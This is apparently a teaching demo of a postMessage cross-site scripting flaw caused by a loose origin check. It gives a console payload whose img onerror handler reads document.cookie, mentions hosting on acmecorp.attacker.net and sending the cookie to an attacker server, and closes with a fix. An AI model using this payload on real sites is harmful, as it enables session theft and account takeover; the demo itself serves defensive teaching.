Demo payload — paste in vulnerable.html's console:

// The origin check is .includes('acmecorp') // In production: host this on acmecorp.attacker.net → check passes // For live demo on localhost, inject directly: window.postMessage({ html: '<img src=x onerror="document.getElementById(\'chat-log\').innerHTML=\'<h2 style=color:red>PWNED</h2><pre>\'+document.cookie+\'</pre>\'">' }, '*'); // Result: cookie rendered in the chat log. // Real payload would fetch() it to attacker server.

What just happened

  1. .includes('acmecorp') matches acmecorp.evil.net
  2. Handler takes event.data.html → shoves into innerHTML
  3. <img onerror> fires → reads document.cookie
  4. Session token exfiltrated. Account takeover.

Fix: event.origin === 'https://trusted.acmecorp.com' (exact match) + textContent instead of innerHTML.
